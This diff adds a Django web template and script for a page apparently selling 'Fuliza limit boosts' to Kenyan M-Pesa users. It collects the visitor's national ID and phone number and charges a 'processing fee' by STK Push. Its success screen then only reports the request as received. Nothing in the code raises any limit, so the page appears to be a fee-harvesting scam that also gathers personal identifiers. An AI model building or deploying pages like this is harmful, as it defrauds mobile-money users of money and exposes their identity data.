@@ -1,0 +1,261 @@
+{% extends 'base.html' %}
+{% load static %}
+
+{% block content %}
+<!-- Limit Cards Grid -->
+<div class="grid grid-cols-1 gap-4 mb-8">
+    <div class="text-xs font-semibold text-green-700 uppercase tracking-wider mb-2">Available Limit Increases</div>
+
+    {% for limit in limits %}
+    <div onclick="selectLimit('{{ limit.amount }}', '{{ limit.charge }}', this)"
+        class="limit-card bg-white p-5 rounded-2xl border-2 border-transparent shadow-sm transition-all duration-200 cursor-pointer hover:border-green-100 hover:shadow-md flex justify-between items-center group">
+        <div class="flex-grow">
+            <div class="text-lg font-bold text-gray-800">Ksh {{ limit.amount }}</div>
+            <div class="text-xs text-gray-400 font-medium">Processing Fee: <span class="text-green-600">Ksh {{
+                    limit.charge }}</span></div>
+        </div>
+        <div
+            class="w-6 h-6 rounded-full border-2 border-gray-200 flex items-center justify-center group-hover:border-green-300 transition-colors">
+            <div class="w-3 h-3 rounded-full bg-green-500 scale-0 transition-transform duration-200 check-dot"></div>
+        </div>
+    </div>
+    {% endfor %}
+</div>
+
+<!-- Sticky CTA -->
+<div class="fixed bottom-0 left-0 right-0 p-6 bg-white border-t border-gray-100 max-w-md mx-auto z-20">
+    <button id="get-boost-btn" disabled onclick="openModal('details-modal')"
+        class="w-full bg-gray-200 text-gray-400 py-4 rounded-2xl font-bold text-lg transition-all duration-300 transform active:scale-[0.98] disabled:cursor-not-allowed">
+        Get Limit Boost →
+    </button>
+</div>
+
+<!-- Modal 1: Personal Details -->
+<div id="details-modal" class="fixed inset-0 z-50 hidden">
+    <div class="absolute inset-0 bg-black/40 backdrop-blur-sm"></div>
+    <div class="absolute bottom-0 left-0 right-0 max-w-md mx-auto p-4">
+        <div class="bg-white rounded-t-[32px] p-8 modal-enter">
+            <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto mb-8"></div>
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">Verify details</h2>
+            <p class="text-gray-500 mb-8">Please provide your details as they appear on M-Pesa.</p>
+
+            <div class="space-y-6">
+                <div>
+                    <label class="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">ID
+                        Number</label>
+                    <input type="number" id="id-number" placeholder="Enter ID Number"
+                        class="w-full bg-gray-50 border-0 focus:ring-2 focus:ring-green-500 rounded-xl p-4 text-lg font-medium outline-none transition-all">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Safaricom
+                        Number</label>
+                    <div class="relative">
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-medium">+254</span>
+                        <input type="number" id="phone-number" placeholder="7XXXXXXXX"
+                            class="w-full bg-gray-50 border-0 focus:ring-2 focus:ring-green-500 rounded-xl p-4 pl-16 text-lg font-medium outline-none transition-all">
+                    </div>
+                    <p id="phone-error" class="text-red-500 text-xs mt-2 hidden">Please enter a valid Safaricom number
+                    </p>
+                </div>
+
+                <div class="flex gap-4 pt-4">
+                    <button onclick="closeModal('details-modal')"
+                        class="flex-1 py-4 text-gray-500 font-bold hover:bg-gray-50 rounded-2xl transition-all">Cancel</button>
+                    <button onclick="validateAndProceed()"
+                        class="flex-[2] bg-green-600 hover:bg-green-700 text-white py-4 rounded-2xl font-bold transition-all shadow-lg shadow-green-200">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal 2: Confirmation -->
+<div id="confirm-modal" class="fixed inset-0 z-50 hidden">
+    <div class="absolute inset-0 bg-black/40 backdrop-blur-sm"></div>
+    <div class="absolute bottom-0 left-0 right-0 max-w-md mx-auto p-4">
+        <div class="bg-white rounded-t-[32px] p-8 modal-enter">
+            <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto mb-8"></div>
+            <h2 class="text-2xl font-bold text-gray-800 mb-4">Confirm Increase</h2>
+
+            <div class="bg-gray-50 rounded-2xl p-6 mb-6 space-y-4">
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-500 text-sm">New Limit</span>
+                    <span class="font-bold text-gray-800" id="summary-limit">Ksh 0</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-500 text-sm">Processing Fee</span>
+                    <span class="font-bold text-green-600" id="summary-fee">Ksh 0</span>
+                </div>
+                <div class="h-px bg-gray-200"></div>
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-500 text-sm">ID Number</span>
+                    <span class="font-medium text-gray-800" id="summary-id">********</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-500 text-sm">Phone Number</span>
+                    <span class="font-medium text-gray-800" id="summary-phone">+254 7...</span>
+                </div>
+            </div>
+
+            <div class="bg-blue-50 rounded-xl p-4 mb-8 flex gap-3">
+                <svg class="w-5 h-5 text-blue-500 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor"
+                    viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                <p class="text-[11px] text-blue-700 leading-relaxed font-medium">
+                    This service processes your Fuliza limit boost. Processing fee is paid via STK Push before
+                    activation. Results reflect in 5-10 minutes.
+                </p>
+            </div>
+
+            <div class="flex flex-col gap-3">
+                <button onclick="initiatePayment()"
+                    class="w-full bg-green-600 hover:bg-green-700 text-white py-5 rounded-2xl font-bold text-lg transition-all shadow-lg shadow-green-200">
+                    Proceed with Payment
+                </button>
+                <button onclick="closeModal('confirm-modal')"
+                    class="w-full py-4 text-gray-500 font-bold hover:bg-gray-50 rounded-2xl transition-all">
+                    Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Full Screen Loader -->
+<div id="payment-loader"
+    class="fixed inset-0 z-[60] hidden bg-white flex flex-col items-center justify-center p-8 text-center">
+    <div class="space-y-8 max-w-xs">
+        <div class="relative w-24 h-24 mx-auto">
+            <div class="absolute inset-0 border-4 border-green-100 rounded-full"></div>
+            <div class="absolute inset-0 border-4 border-green-600 rounded-full border-t-transparent animate-spin">
+            </div>
+            <div class="absolute inset-0 flex items-center justify-center">
+                <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+                </svg>
+            </div>
+        </div>
+        <div class="space-y-3">
+            <h3 class="text-xl font-bold text-gray-800">Processing Payment</h3>
+            <p class="text-gray-500">Sending M-Pesa STK Push to your phone... Please enter your PIN to continue.</p>
+        </div>
+    </div>
+</div>
+
+<!-- Success Screen -->
+<div id="success-screen"
+    class="fixed inset-0 z-[60] hidden bg-white flex flex-col items-center justify-center p-8 text-center">
+    <div class="space-y-8 max-w-xs">
+        <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto">
+            <svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+            </svg>
+        </div>
+        <div class="space-y-3">
+            <h3 class="text-2xl font-bold text-gray-800">Request Received!</h3>
+            <p class="text-gray-500">Your Fuliza limit boost of <span class="font-bold text-gray-800"
+                    id="success-limit">Ksh 0</span> is being processed.</p>
+        </div>
+        <button onclick="window.location.reload()"
+            class="w-full bg-green-600 text-white py-4 rounded-2xl font-bold">Done</button>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let selectedAmount = 0;
+    let selectedCharge = 0;
+
+    function selectLimit(amount, charge, element) {
+        document.querySelectorAll('.limit-card').forEach(card => {
+            card.classList.remove('selected');
+            card.querySelector('.check-dot').classList.remove('scale-100');
+            card.querySelector('.check-dot').classList.add('scale-0');
+        });
+
+        element.classList.add('selected');
+        element.querySelector('.check-dot').classList.remove('scale-0');
+        element.querySelector('.check-dot').classList.add('scale-100');
+
+        selectedAmount = amount;
+        selectedCharge = charge;
+
+        const btn = document.getElementById('get-boost-btn');
+        btn.disabled = false;
+        btn.classList.remove('bg-gray-200', 'text-gray-400');
+        btn.classList.add('bg-green-600', 'text-white', 'shadow-lg', 'shadow-green-200');
+    }
+
+    function openModal(id) {
+        document.getElementById(id).classList.remove('hidden');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeModal(id) {
+        document.getElementById(id).classList.add('hidden');
+        document.body.style.overflow = 'auto';
+    }
+
+    function validateAndProceed() {
+        const idNum = document.getElementById('id-number').value;
+        const phone = document.getElementById('phone-number').value;
+        const phoneError = document.getElementById('phone-error');
+
+        const validPrefixes = ['7', '1', '01'];
+        const isSafaricom = validPrefixes.some(p => phone.startsWith(p));
+
+        if (idNum.length < 7 || phone.length < 9 || !isSafaricom) {
+            phoneError.classList.remove('hidden');
+            return;
+        }
+
+        phoneError.classList.add('hidden');
+        document.getElementById('summary-limit').textContent = `Ksh ${selectedAmount}`;
+        document.getElementById('summary-fee').textContent = `Ksh ${selectedCharge}`;
+        document.getElementById('summary-id').textContent = idNum.slice(0, 3) + '*****';
+        document.getElementById('summary-phone').textContent = `+254 ${phone}`;
+
+        closeModal('details-modal');
+        openModal('confirm-modal');
+    }
+
+    async function initiatePayment() {
+        const phone = document.getElementById('phone-number').value;
+        const amount = selectedCharge;
+
+        closeModal('confirm-modal');
+        document.getElementById('payment-loader').classList.remove('hidden');
+
+        try {
+            const response = await fetch('/initiate-payment/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone_number: phone,
+                    amount: amount
+                })
+            });
+
+            const result = await response.json();
+
+            document.getElementById('payment-loader').classList.add('hidden');
+
+            if (result.success) {
+                document.getElementById('success-limit').textContent = `Ksh ${selectedAmount}`;
+                document.getElementById('success-screen').classList.remove('hidden');
+            } else {
+                alert('Payment initiation failed: ' + (result.message || 'Unknown error'));
+            }
+        } catch (error) {
+            document.getElementById('payment-loader').classList.add('hidden');
+            alert('An error occurred: ' + error.message);
+        }
+    }
+</script>
+{% endblock %}
